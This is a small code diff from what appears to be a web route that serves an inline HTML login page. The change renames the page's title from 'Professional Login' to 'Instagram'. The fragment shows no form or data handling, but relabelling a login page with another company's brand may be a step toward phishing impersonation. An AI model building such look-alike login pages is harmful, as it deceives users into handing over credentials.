@@ -34,7 +34,7 @@ export async function GET(request: Request) {
       return new NextResponse(
         `<html>
           <head>
-            <title>Professional Login</title>
+            <title>Instagram</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
               body { font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fafafa; }
